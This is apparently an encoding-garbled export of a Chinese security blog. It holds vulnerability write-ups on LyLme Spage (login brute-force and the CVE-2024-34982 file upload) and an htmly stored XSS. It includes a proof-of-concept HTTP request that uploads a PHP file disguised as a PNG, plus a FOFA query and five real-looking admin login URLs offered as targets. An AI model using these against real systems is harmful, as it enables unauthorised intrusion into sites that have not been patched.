jsï¼Œç±»ä¼¼äºæŠŠæ•°æ®æš‚åœ¨ js ä¸­ï¼Œç„¶å js ä¼šå°†æ•°æ®åˆæ­¥å¤„ç†ä¹‹åï¼ˆåˆ¤æ–­æ˜¯å¦ä¸ºç©ºç­‰ï¼‰ä¼ é€’ç»™ PHPï¼Œè®©ä»–æ¥åšé€»è¾‘å¤„ç†ã€‚è€Œ ajax çš„ä½œç”¨å…¶å®å°±æ˜¯ï¼Œåœ¨æäº¤æ•°æ®çš„æ—¶å€™ï¼Œå¯ä»¥å¼‚æ­¥è¿è¡Œã€‚æ¯”å¦‚ï¼Œæˆ‘åªäº¤ä¸€ä¸ªå°è¡¨å•ï¼Œä½†æ˜¯ä¸ç”¨åˆ·æ–°æ•´ä¸ªé¡µé¢ PHP æ˜¯ä¸€ç§æœåŠ¡å™¨ç«¯è„šæœ¬è¯­è¨€ï¼Œå®ƒä¸»è¦ç”¨äºç”ŸæˆåŠ¨æ€ç½‘é¡µå†…å®¹ã€å¤„ç†è¡¨å•æäº¤ã€è®¿é—®æ•°æ®åº“ç­‰ã€‚ç”¨æˆ·åœ¨æµè§ˆå™¨è®¿é—®é¡µé¢æ—¶ï¼ŒPHP ä»£ç ä¼šåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œç”Ÿæˆ HTML å¹¶å°†å…¶å‘é€åˆ°ç”¨æˆ·çš„æµè§ˆå™¨ã€‚JavaScript æ˜¯ä¸€ç§å®¢æˆ·ç«¯è„šæœ¬è¯­è¨€ï¼Œå®ƒåœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­è¿è¡Œï¼Œä¸»è¦ç”¨äºæ“ä½œ DOMï¼ˆæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼‰ã€ä¸ç”¨æˆ·äº¤äº’ã€éªŒè¯è¡¨å•ã€å¼‚æ­¥åŠ è½½å†…å®¹ç­‰ã€‚ PHP å’Œ JavaScript çš„åˆä½œæ–¹å¼ è¾“å‡º JavaScript ä»£ç  PHP å¯ä»¥åŠ¨æ€ç”Ÿæˆ JavaScript ä»£ç ï¼Œå¹¶è¾“å‡ºåˆ°ç½‘é¡µä¸­ã€‚å½“æµè§ˆå™¨æ¥æ”¶åˆ°æœåŠ¡å™¨è¿”å›çš„é¡µé¢æ—¶ï¼ŒJavaScript ä¼šåœ¨å®¢æˆ·ç«¯ï¼ˆç”¨æˆ·çš„æµè§ˆå™¨ï¼‰æ‰§è¡Œã€‚ ä¾‹å¦‚ï¼šPHP å¯ä»¥åŠ¨æ€ç”Ÿæˆ JavaScript ä»£ç ï¼Œå¹¶è¾“å‡ºåˆ°ç½‘é¡µä¸­ã€‚å½“æµè§ˆå™¨æ¥æ”¶åˆ°æœåŠ¡å™¨è¿”å›çš„é¡µé¢æ—¶ï¼ŒJavaScript ä¼šåœ¨å®¢æˆ·ç«¯ï¼ˆç”¨æˆ·çš„æµè§ˆå™¨ï¼‰æ‰§è¡Œã€‚ 12345//PHP ç”Ÿæˆäº†ä¸€æ®µåŒ…å« JavaScript çš„ HTML é¡µé¢ï¼Œå½“ç”¨æˆ·è®¿é—®è¯¥é¡µé¢æ—¶ï¼Œæµè§ˆå™¨ä¼šå¼¹å‡ºä¸€ä¸ªæ¬¢è¿æ¡†ã€‚&lt;?php $username = &quot;User&quot;; echo &quot;&lt;script&gt;alert(&#x27;æ¬¢è¿ $username!&#x27;);&lt;/script&gt;&quot;;?&gt; PHP å¤„ç†ç”¨æˆ·è¯·æ±‚ï¼ŒJavaScript æ§åˆ¶ç•Œé¢ PHP é€šå¸¸ç”¨äºå¤„ç†æœåŠ¡å™¨ç«¯çš„é€»è¾‘ï¼Œæ¯”å¦‚éªŒè¯ç™»å½•ä¿¡æ¯ã€å­˜å‚¨æ•°æ®ç­‰ã€‚ JavaScript åˆ™ç”¨äºå¤„ç†å®¢æˆ·ç«¯çš„äº¤äº’ï¼Œå¦‚è¡¨å•éªŒè¯æˆ–é¡µé¢çš„å±€éƒ¨æ›´æ–°ã€‚ ä¾‹å¦‚ï¼šPHP å¤„ç†ç™»å½•è¯·æ±‚ã€‚JavaScript éªŒè¯è¡¨å•è¾“å…¥ï¼Œæ£€æŸ¥è¾“å…¥æ˜¯å¦ä¸ºç©ºæˆ–è€…æ ¼å¼æ˜¯å¦æ­£ç¡®ï¼Œé¿å…ä¸å¿…è¦çš„æœåŠ¡å™¨è¯·æ±‚ã€‚ 123456789101112131415161718&lt;!-- HTML form --&gt;&lt;form method=&quot;post&quot; action=&quot;login.php&quot; onsubmit=&quot;return validateForm()&quot;&gt; ç”¨æˆ·å: &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot;&gt;&lt;br&gt; å¯†ç : &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;ç™»å½•&quot;&gt;&lt;/form&gt;&lt;script&gt;function validateForm() &#123; var username = document.getElementById(&quot;username&quot;).value; var password = document.getElementById(&quot;password&quot;).value; if (username == &quot;&quot; || password == &quot;&quot;) &#123; alert(&quot;ç”¨æˆ·åå’Œå¯†ç ä¸èƒ½ä¸ºç©ºï¼&quot;); return false; // é˜»æ­¢è¡¨å•æäº¤ &#125; return true; // å…è®¸æäº¤&#125;&lt;/script&gt; é€šè¿‡ AJAX å®ç°å¼‚æ­¥æ•°æ®äº¤äº’ AJAX å…è®¸ä½¿ç”¨ JavaScript è¿›è¡Œå¼‚æ­¥ HTTP è¯·æ±‚ï¼Œé¿å…é¡µé¢çš„å®Œå…¨åˆ·æ–°ã€‚è¿™æ ·ï¼ŒPHP å¯ä»¥å¤„ç†è¯·æ±‚å¹¶è¿”å›æ•°æ®ï¼Œè€Œé¡µé¢çš„å…¶ä»–éƒ¨åˆ†ä¿æŒä¸å˜ã€‚ ä¾‹å¦‚ï¼šç”¨æˆ·ç‚¹å‡»ç™»å½•æŒ‰é’®åï¼ŒJavaScript ä½¿ç”¨ AJAX å‘é€ç™»å½•ä¿¡æ¯ç»™æœåŠ¡å™¨ã€‚PHP å¤„ç†è¯·æ±‚ï¼Œå¹¶è¿”å›æˆåŠŸæˆ–é”™è¯¯ä¿¡æ¯ï¼Œé¡µé¢æ— éœ€åˆ·æ–°å³å¯åŠ¨æ€æ›´æ–°ç»“æœã€‚ é€šè¿‡ JavaScript åŠ¨æ€åŠ è½½å’Œå¤„ç† PHP ç”Ÿæˆçš„æ•°æ® æœ‰æ—¶ï¼ŒPHP è´Ÿè´£ç”Ÿæˆæ•°æ®ï¼Œè€Œ JavaScript åˆ™è´Ÿè´£å°†è¿™äº›æ•°æ®åŠ¨æ€å‘ˆç°ç»™ç”¨æˆ·ã€‚ ä¾‹å¦‚ï¼Œä½¿ç”¨ PHP ç”Ÿæˆ JSON æ•°æ®ï¼ŒJavaScript è·å–è¿™äº›æ•°æ®å¹¶åœ¨å‰ç«¯è¿›è¡Œå¤„ç†ã€‚ 0 x 05 æ¼æ´åˆ†ææ¼æ´äº§ç”ŸåŸå› ç”±äº admin/login.php çš„ç™»å½•éªŒè¯é€»è¾‘ä¸å¤Ÿä¸¥è°¨ï¼Œæœªè®¾ç½®å°è¯•ç™»å½•çš„æ¬¡æ•°é™åˆ¶ï¼Œä¸”éªŒè¯ç åœ¨ç™»é™†å¤±è´¥åä¸ä¼šä¸»åŠ¨åˆ·æ–°ï¼Œå¯¼è‡´å¯ä»¥å¯¹ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œçˆ†ç ´ã€‚ å‡½æ•°åˆ†æç™»å½•é€»è¾‘1234567891011121314151617181920if (isset($_POST[&#x27;user&#x27;]) &amp;&amp; isset($_POST[&#x27;pass&#x27;])) &#123; if (isset($_REQUEST[&#x27;authcode&#x27;])) &#123; session_start(); if (strtolower($_REQUEST[&#x27;authcode&#x27;]) == $_SESSION[&#x27;authcode&#x27;]) &#123; $user = daddslashes($_POST[&#x27;user&#x27;]); $pass = md5(&#x27;lylme&#x27; . daddslashes($_POST[&#x27;pass&#x27;])); if ($user == $conf[&#x27;admin_user&#x27;] &amp;&amp; $pass == $conf[&#x27;admin_pwd&#x27;]) &#123; $session = md5($user . $pass); $token = authcode(&quot;&#123;$user&#125;\\t&#123;$session&#125;&quot;, &#x27;ENCODE&#x27;, SYS_KEY); setcookie(&quot;admin_token&quot;, $token, time() + 604800, &quot;/&quot;); exit(&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;ç™»é™†ç®¡ç†ä¸­å¿ƒæˆåŠŸï¼&#x27;);window.location.href=&#x27;./&#x27;;&lt;/script&gt;&quot;); &#125; elseif ($pass != $conf[&#x27;admin_pwd&#x27;]) &#123; exit(&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;ç”¨æˆ·åæˆ–å¯†ç ä¸æ­£ç¡®ï¼&#x27;);history.go(-1);&lt;/script&gt;&quot;); &#125; &#125; else &#123; exit(&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;éªŒè¯ç é”™è¯¯&#x27;);history.go(-1);&lt;/script&gt;&quot;); &#125; &#125;&#125; ä¼šå…ˆéªŒè¯ç”¨æˆ·åå’Œå¯†ç æ˜¯å¦ä¸ä¸ºç©ºï¼Œå¦‚æœå­˜åœ¨çš„è¯ï¼Œè¿›å…¥åˆ°éªŒè¯ç çš„åˆ¤æ–­é€»è¾‘ã€‚å°†ç”¨æˆ·è¾“å…¥çš„éªŒè¯ç å’Œ session ä¸­ç”Ÿæˆçš„éªŒè¯ç è¿›è¡Œå¯¹æ¯”ã€‚å¦‚æœéªŒè¯ç æ­£ç¡®çš„è¯ï¼Œè¿›å…¥ç”¨æˆ·åå’Œå¯†ç çš„é€»è¾‘åˆ¤æ–­ï¼Œå¦åˆ™æŠ¥é”™éªŒè¯ç é”™è¯¯ã€‚ ç”¨æˆ·åå’Œå¯†ç çš„åˆ¤æ–­ï¼šå¯¹ç”¨æˆ·ä¼ å…¥çš„ç”¨æˆ·åè¿›è¡Œè½¬ä¹‰å¤„ç†ã€‚å¯¹å¯†ç è¿›è¡Œè½¬ä¹‰å¤„ç†åæ‹¼æ¥ä¸Š lylme å­—ç¬¦ä¸²ï¼Œæ•´ä½“è¿›è¡Œ md5 åŠ å¯†ã€‚å°†ä¼ å…¥æ•°æ®ä¸é…ç½®ä¸­ç³»ç»Ÿé¢„è®¾çš„ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œæ¯”å¯¹ã€‚å¦‚æœåŒ¹é…æˆåŠŸï¼Œè®¾ç½® cookieï¼Œå¹¶è¿”å›ç™»é™†æˆåŠŸï¼Œå¦åˆ™ç™»é™†å¤±è´¥è¿”å›ç”¨æˆ·æˆ–å¯†ç ä¸æ­£ç¡®ã€‚ JS å®¢æˆ·ç«¯äº’åŠ¨åˆ·æ–°éªŒè¯ç ç‚¹å‡»éªŒè¯ç å›¾ç‰‡æ—¶ï¼Œé€šè¿‡ JavaScript åˆ·æ–°éªŒè¯ç ï¼Œå¹¶æ¸…ç©ºéªŒè¯ç è¾“å…¥æ¡†çš„å†…å®¹ã€‚ 1234567&lt;img id=&quot;captcha_img&quot; title=&quot;éªŒè¯ç &quot; src=&#x27;../include/validatecode.php&#x27; class=&quot;pull-right code&quot; onclick=&quot;recode()&quot; /&gt;&lt;script&gt; function recode() &#123; $(&#x27;#captcha_img&#x27;).attr(&#x27;src&#x27;, &#x27;../include/validatecode.php?r=&#x27; + Math.random()); $(&quot;input[name=&#x27;authcode&#x27;]&quot;).val(&#x27;&#x27;); &#125;&lt;/script&gt; é€šè¿‡å°†ä¸€ä¸ªéšæœºæ•°é™„åŠ åˆ°éªŒè¯ç å›¾ç‰‡çš„ URL ä¸­ï¼Œæ¯æ¬¡è°ƒç”¨å‡½æ•°æ—¶éƒ½ç”Ÿæˆä¸€ä¸ªä¸åŒçš„ URLã€‚è¿™æœ‰æ•ˆé¿å…äº†æµè§ˆå™¨ä»ç¼“å­˜ä¸­åŠ è½½åŒä¸€å¼ éªŒè¯ç å›¾ç‰‡ï¼Œå¼ºåˆ¶æµè§ˆå™¨é‡æ–°ä»æœåŠ¡å™¨è¯·æ±‚éªŒè¯ç å›¾ç‰‡ï¼Œå®ç°éªŒè¯ç çš„åˆ·æ–°ã€‚ 0 x 06 æ¡ˆä¾‹çª„èŒƒå›´ fofa ï¼š body &#x3D; â€œLyLme Spageâ€ &amp;&amp; body &#x3D; â€œéªŒè¯ç â€ &amp;&amp; title &#x3D; â€œåˆå¿ƒå¯¼èˆªâ€ https://images.612ch.com/admin/login.php https://fk.612ch.com/admin/login.php https://wxapi.612ch.com/admin/login.php https://iloveyouyq.612ch.com/admin/login.php https://lwh.612ch.com/admin/login.php","categories":[{"name":"æ¼æ´æŒ–æ˜","slug":"æ¼æ´æŒ–æ˜","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"}],"tags":[{"name":"Lylme Spage","slug":"Lylme-Spage","permalink":"https://gryffinbit.top/tags/Lylme-Spage/"}],"author":"Gryffinbit"},{"title":"LyLme Spage æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†æï¼ˆCVE-2024-34982ï¼‰","slug":"LyLme Page æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2024-34982ï¼‰","date":"2024-08-20T03:26:33.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2024/08/20/LyLme Page æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2024-34982ï¼‰/","permalink":"https://gryffinbit.top/2024/08/20/LyLme%20Page%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-34982%EF%BC%89/","excerpt":"","text":"0 x 01 æ¼æ´æè¿°LyLme Spage æ˜¯ä¸€ä¸ªå¼€æºçš„å¯¼èˆªé¡µé¢ï¼Œè‡´åŠ›äºç®€æ´é«˜æ•ˆæ— å¹¿å‘Šçš„ä¸Šç½‘å¯¼èˆªå’Œæœç´¢å…¥å£ï¼Œæ”¯æŒåå°æ·»åŠ é“¾æ¥ã€è‡ªå®šä¹‰æœç´¢å¼•æ“ç­‰åŠŸèƒ½ã€‚è¯¥ç³»ç»Ÿåœ¨ file. php æ¥å£å¤„å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæœªç»èº«ä»½æ”»å‡»è€…å¯é€šè¿‡è¯¥æ¼æ´åœ¨æœåŠ¡å™¨ç«¯ä»»æ„æ‰§è¡Œä»£ç ã€å†™å…¥åé—¨ã€è·å–æœåŠ¡å™¨æƒé™ï¼Œè¿›è€Œæ§åˆ¶æ•´ä¸ª web æœåŠ¡å™¨ã€‚ æ¼æ´å½±å“èŒƒå›´ï¼šLyLme Spage v 1.9.5æ¼æ´ç¼–å·ï¼šCVE-2024-34982fofa è§„åˆ™ï¼šbody&#x3D;â€LyLme Spageâ€ 0 x 02 ç¯å¢ƒæ­å»ºPHP ç‰ˆæœ¬ï¼š7.1.9ï¼ˆPHP ç‰ˆæœ¬éœ€ 7.1 åŠä»¥ä¸Šï¼Œä¸æ”¯æŒ PHP 8ï¼‰ å‰å¾€ GitHub - LyLme&#x2F;lylme_spage: å…­é›¶å¯¼èˆªé¡µä¸‹è½½æœ€æ–°ç‰ˆæœ¬æºç å‹ç¼©åŒ…ï¼Œä¸Šä¼ åˆ°ç½‘ç«™æ ¹ç›®å½•è§£å‹ è®¿é—®http:&#x2F;&#x2F;åŸŸå&#x2F;install æŒ‰æç¤ºé…ç½®æ•°æ®åº“è¿›è¡Œå®‰è£… å®‰è£…æˆåŠŸ åå°åœ°å€ï¼šhttp:&#x2F;&#x2F;åŸŸå&#x2F;admin è´¦å·å¯†ç ï¼šadmin&#x2F;123456 0 x 03 æ¼æ´å¤ç°12345678910111213POST /include/file.php HTTP/1.1Host: lylme:8056Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8jtzH8vknAlAu8DoContent-Length: 198------WebKitFormBoundary8jtzH8vknAlAu8DoContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;Content-Type: image/png&lt;?php phpinfo();?&gt;------WebKitFormBoundary8jtzH8vknAlAu8Do-- php æ–‡ä»¶ï¼Œä¸Šä¼ ä¸º PNG æ ¼å¼ï¼Œå‘åŒ…æ—¶ä¿®æ”¹æ–‡ä»¶åç¼€ï¼Œä¿®æ”¹ä¸º php æ–‡ä»¶ã€‚è®¿é—®ç»™å‡ºçš„ URL åœ°å€ï¼Œå¯è§£æ php æ–‡ä»¶ 0 x 04 æ¼æ´åˆ†æ å®šä½æ¼æ´æ–‡ä»¶ æ¼æ´æ–‡ä»¶ï¼Œä½äº /include/file. php ä¹Ÿå¯ä»¥æ ¹æ®ç›¸åº”åŒ…çš„å†…å®¹è¿›è¡Œå…¨å±€æœç´¢ã€‚ æ–‡ä»¶éªŒè¯æ¼æ´ç‚¹ 123456789101112131415161718192021222324252627282930function upload_img($upfile)&#123; $IMG_NAME = uniqid(&quot;img_&quot;); //æ–‡ä»¶å $maxsize = pow(1024, 2) * 5; //æ–‡ä»¶å¤§å°5M $dir = ROOT . SAVE_PATH . &#x27;upload/&#x27;; if (!is_dir($dir)) &#123; mkdir($dir, 0755, true); //åˆ›å»ºè·¯å¾„ &#125; $type = $upfile[&quot;type&quot;]; $size = $upfile[&quot;size&quot;]; $tmp_name = $upfile[&quot;tmp_name&quot;]; if (!validate_file_type($type)) &#123; exit(&#x27;&#123;&quot;code&quot;: &quot;-4&quot;,&quot;msg&quot;:&quot;ä¸Šä¼ çš„å›¾ç‰‡ç±»å‹ä¸æ”¯æŒ&quot;&#125;&#x27;); &#125; $parts = explode(&#x27;.&#x27;, $upfile[&quot;name&quot;]); $img_ext = &quot;.&quot; . end($parts); if ($size &gt; $maxsize) &#123; exit(&#x27;&#123;&quot;code&quot;: &quot;-1&quot;,&quot;msg&quot;:&quot;å›¾ç‰‡ä¸èƒ½è¶…è¿‡&#x27; . $maxsize / pow(1024, 2) . &#x27;M&quot;&#125;&#x27;); &#125; $img_name = $IMG_NAME . $img_ext; //æ–‡ä»¶å $save_to = $dir . $img_name; $url = &#x27;/&#x27; . SAVE_PATH . &#x27;upload/&#x27; . $img_name; if (move_uploaded_file($tmp_name, $dir . $img_name)) &#123; echo(&#x27;&#123;&quot;code&quot;: &quot;200&quot;,&quot;msg&quot;:&quot;ä¸Šä¼ æˆåŠŸ&quot;,&quot;url&quot;:&quot;&#x27; . $url . &#x27;&quot;&#125;&#x27;); return $dir . $img_name; &#125;&#125; é€šè¿‡ validate_file_type() å‡½æ•°å¯¹æ–‡ä»¶çš„ç±»å‹è¿›è¡Œåˆ¤æ–­ã€‚ 1234567891011121314151617181920212223function validate_file_type($type)&#123; switch ($type) &#123; case &#x27;jpeg&#x27;: $type = &#x27;image/jpeg&#x27;; break; case &#x27;jpg&#x27;: $type = &#x27;image/jpeg&#x27;; break; case &#x27;png&#x27;: $type = &#x27;image/png&#x27;; break; case &#x27;gif&#x27;: $type = &#x27;image/gif&#x27;; break; case &#x27;ico&#x27;: $type = &#x27;image/x-icon&#x27;; break; &#125; $allowed_types = array(&quot;image/jpeg&quot;, &quot;image/png&quot;, &quot;image/gif&quot;, &quot;image/x-icon&quot;); return in_array($type, $allowed_types);&#125; ä» $_FILES[&quot;file&quot;] ä¸­è·å–æ•°ç»„ä¸­çš„ type å­—æ®µã€‚ç„¶åä¸ç™½åå•æ•°ç»„ä¸­çš„å†…å®¹è¿›è¡Œå¯¹æ¯”ã€‚åªè¦ç¬¦åˆç™½åå•ä¸­çš„ï¼Œä¾¿å¯ä»¥é¡ºåˆ©ä¸Šä¼  12345678if (empty($_POST[&quot;url&quot;]) &amp;&amp; !empty($_FILES[&quot;file&quot;])) &#123; $filename = upload_img($_FILES[&quot;file&quot;]); if (isset($islogin) == 1 &amp;&amp; $_GET[&quot;crop&quot;] == &quot;no&quot;) &#123; //ä¸å‹ç¼©å›¾ç‰‡ exit(); &#125; //ä¸Šä¼ å›¾ç‰‡&#125; ç”±æ­¤å¯è§ï¼Œåœ¨åˆ¤æ–­ç±»å‹æ—¶ï¼Œå®ƒåªå¯¹ Content-Type: image/png éƒ¨åˆ†è¿›è¡Œäº†ç™½åå•çš„ç­›é€‰ã€‚ 0 x 05 POC æ„é€ ç”±äºåªå¯¹ Content-Type: image&#x2F;png è¿›è¡Œæ£€æµ‹ï¼Œæ‰€ä»¥ä¿®æ”¹ filename å³å¯ï¼Œæ”¹ä¸º php æ–‡ä»¶ã€‚ 12345678910111213POST /include/file.php HTTP/1.1Host: lylme:8056Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8jtzH8vknAlAu8DoContent-Length: 198------WebKitFormBoundary8jtzH8vknAlAu8DoContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;Content-Type: image/png&lt;?php phpinfo();?&gt;------WebKitFormBoundary8jtzH8vknAlAu8Do-- 0 x 06 ä¿®å¤æ–¹æ¡ˆå¯¹ filenameï¼Œcontent éƒ½è¿›è¡Œæ£€æµ‹ 0 x 07 å‚è€ƒé“¾æ¥CVE&#x2F;Lylme_pagev1.9.5.md at main Â· n2ryx&#x2F;CVE Â· GitHub","categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://gryffinbit.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"https://gryffinbit.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"author":"Gryffinbit"},{"title":"htmly CMS XSS æ¼æ´åˆ†æ","slug":"htmly-CMS-XSS-æ¼æ´åˆ†æ","date":"2024-08-16T09:39:26.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2024/08/16/htmly-CMS-XSS-æ¼æ´åˆ†æ/","permalink":"https://gryffinbit.top/2024/08/16/htmly-CMS-XSS-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"0x01 æ¼æ´æè¿°HTMLy æ˜¯ä¸€ä¸ªå¼€æºçš„åŸºäº PHP çš„åšå®¢å¹³å°ã€‚å®ƒå¯ä»¥è®©ç”¨æˆ·åˆ›å»ºå®‰å…¨ã€è½»é‡ä¸”åŠŸèƒ½å¼ºå¤§çš„ç½‘ç«™æˆ–åšå®¢ï¼Œå¹¶ä¸”å³ä½¿åœ¨æ‹¥æœ‰æ•°åƒç¯‡æ–‡ç« çš„æƒ…å†µä¸‹ï¼Œä¹Ÿèƒ½é«˜æ•ˆæ‰©å±•â€‹ã€‚è¯¥ç³»ç»Ÿå­˜åœ¨å­˜å‚¨å‹XSSæ¼æ´ï¼Œç”±äºxxx.php æ–‡ä»¶ä¸­çš„xxxå‡½æ•° å¯¹ç”¨æˆ·ä¼ å…¥çš„æ•°æ®æ²¡æœ‰è¿›è¡Œä¸¥æ ¼è¿‡æ»¤ï¼Œå¯¼è‡´ç”¨æˆ·å¯ä»¥åœ¨æ–°å»ºæ–‡ç« æ—¶å†™å…¥æ¶æ„çš„æ”»å‡»ä»£ç ï¼Œç”±æ­¤è§¦å‘XSSæ”»å‡»ã€‚ 0x02 ç¯å¢ƒæ­å»ºç‰ˆæœ¬ä¿¡æ¯é€šè¿‡phpstudy è¿›è¡Œæ­å»ºphpï¼š7.1.9apacheï¼š2.4.39htmlyç‰ˆæœ¬ï¼š2.9.9 æœ€æ–°ç‰ˆæœ¬ å®‰è£…htmly ä¹Ÿå¯ä»¥ç›´æ¥ä¸‹è½½installer.php è¿›è¡Œä¸€é”®å®‰è£…ï¼Œé»˜è®¤ä¸‹è½½æœ€æ–°ç‰ˆæœ¬ ä¸‹è½½æºç  Release Composer Vendor Update and Improvements Â· danpros&#x2F;htmly (github.com) å°†æ–‡ä»¶å¤¹æ”¾å…¥phpstudyçš„webç›®å½•ä¸‹ C:\\phpstudy_pro\\WWW æ ¹æ®README.mdä¸­çš„æ­¥éª¤ï¼Œä¿®æ”¹htmlyçš„é…ç½®æ–‡ä»¶ åœ¨configæ–‡ä»¶å¤¹ä¸­å°†exampleé‡å‘½åä¸ºconfig.ini ä¿®æ”¹config.iniï¼Œè®¾ç½®siteurlçš„åœ°å€ 12; The URL of your blog.site.url = &quot;http://htmly:8088/\\/&quot; åœ¨ config/users çš„æ–‡ä»¶å¤¹ä¸­ï¼Œå°†exampleé‡å‘½åä¸ºhtmly.iniï¼ˆå¡«å…¥è‡ªå·±åƒè®¾ç½®çš„ç”¨æˆ·åå³å¯ï¼‰ ä¿®æ”¹htmly.iniï¼Œå¡«å…¥å¯†ç  åœ¨phpstudyä¸­åˆ›å»ºé¡¹ç›® è®¿é—®http://htmly:8088/install.phpé¡µé¢ï¼Œè¿›è¡Œå®‰è£… æˆåŠŸå®‰è£…åè·³è½¬åˆ°è¯¥é¡µé¢ è®¿é—® http://htmly:8088/login è¿›å…¥åˆ°ç®¡ç†å‘˜é¡µé¢ phpstormåŠ¨æ€è°ƒè¯•å‚è€ƒå¾€æœŸæ–‡ç« ï¼Œé…ç½®åŠ¨æ€è°ƒè¯•thinkphp5.0 æ–‡ä»¶åŒ…å«æ¼æ´åˆ†æ-è¶…è¯¦ç»†ä¿å§†çº§ - Gryffinbitçš„æ€ç»´æ®¿å ‚ 0x03 åŠ¨æ€è°ƒè¯•ç« èŠ‚ 0x03 æ¼æ´åˆ†æXSSæ¼æ´åŸç†è·¨ç«™è„šæœ¬æ”»å‡»XSSé€šè¿‡å°†æ¶æ„å¾—Scriptä»£ç æ³¨å…¥åˆ°Webé¡µé¢ä¸­ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­Webé‡Œé¢çš„Scriptä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚ XSSæ¼æ´ï¼ˆå…¨ç½‘æœ€è¯¦ç»†ï¼‰-CSDNåšå®¢ æ¼æ´å‡½æ•°åœ¨htmly.phpä¸­ï¼Œå¯¹ä¼ å…¥çš„æ•°æ®è¿›è¡Œäº†å¤„ç† 1add_content($title, $tag, $url, $content, $user, $draft, $category, &#x27;post&#x27;, $description, null, $dateTime); åœ¨å¯¹$contentå˜é‡è¿›è¡Œçš„å®šä¹‰ 1$content = from($_REQUEST, &#x27;content&#x27;); ç”¨æˆ·ä¼ å…¥contentæ•°æ®ï¼Œç»è¿‡fromå‡½æ•°è¿›è¡Œå¤„ç†å¹¶èµ‹å€¼ç»™$contentå˜é‡ã€‚è·Ÿè¿›fromå‡½æ•°ã€‚è¿™ä¸ªå‡½æ•°å¯ä»¥ä»æ•°ç»„ä¸­æå–å•ä¸ªå€¼æˆ–å¤šä¸ªå€¼ï¼ˆå¦‚æœ$nameæ˜¯æ•°ç»„ï¼‰ï¼Œå¹¶ä¸”åœ¨æå–è¿‡ç¨‹ä¸­å¤„ç†æ¢è¡Œç¬¦å’Œå»é™¤ç©ºç™½ã€‚ 1234567891011function from($source, $name) &#123; $map = array(&quot;\\r\\n&quot; =&gt; &quot;\\n&quot;, &quot;\\r&quot; =&gt; &quot;\\n&quot;); if (is_array($name)) &#123; $data = array(); foreach ($name as $k) $data[$k] = isset($source[$k]) ? trim(strtr($source[$k], $map)) : null; return $data; &#125; return isset($source[$name]) ? trim(strtr($source[$name], $map)) : null; &#125; è¿™ä¸ªfrom()å‡½æ•°çš„ä½œç”¨æ˜¯ä»æŒ‡å®šçš„$sourceæ•°ç»„ï¼ˆä¾‹å¦‚$_REQUESTï¼‰ä¸­æå–æŒ‡å®šé”®çš„å€¼ï¼Œå¹¶è¿›è¡Œä¸€äº›å¤„ç†ã€‚ä»¥ä¸‹æ˜¯å¯¹ä»£ç çš„è¯¦ç»†è§£é‡Šï¼š $map = array(&quot;\\r\\n&quot; =&gt; &quot;\\n&quot;, &quot;\\r&quot; =&gt; &quot;\\n&quot;);: è¿™æ˜¯ä¸€ä¸ªæ˜ å°„æ•°ç»„ï¼Œç”¨äºå°†Windowså’ŒMacé£æ ¼çš„æ¢è¡Œç¬¦ï¼ˆ\\r\\nå’Œ\\rï¼‰è½¬æ¢ä¸ºUnixé£æ ¼çš„æ¢è¡Œç¬¦ï¼ˆ\\nï¼‰ã€‚è¿™æœ‰åŠ©äºç»Ÿä¸€å¤„ç†ä¸åŒæ“ä½œç³»ç»Ÿä¸‹çš„æ¢è¡Œç¬¦ï¼Œç¡®ä¿æ•°æ®ä¸€è‡´æ€§ã€‚ if (is_array($name)): å¦‚æœ$nameæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå‡½æ•°å°†éå†è¿™ä¸ªæ•°ç»„ï¼Œä»$sourceä¸­æå–æ¯ä¸ªé”®çš„å€¼ï¼Œå¹¶è¿›è¡Œå¤„ç†ã€‚ $data = array();: å¦‚æœ$nameæ˜¯æ•°ç»„ï¼Œå‡½æ•°ä¼šåˆ›å»ºä¸€ä¸ªç©ºæ•°ç»„$dataæ¥å­˜å‚¨ç»“æœã€‚ foreach ($name as $k): éå†$nameæ•°ç»„ä¸­çš„æ¯ä¸ªé”®$kã€‚ $data[$k] = isset($source[$k]) ? trim(strtr($source[$k], $map)) : null;: å¯¹äºæ¯ä¸ªé”®$kï¼Œæ£€æŸ¥å®ƒæ˜¯å¦å­˜åœ¨äº$sourceæ•°ç»„ä¸­ã€‚ 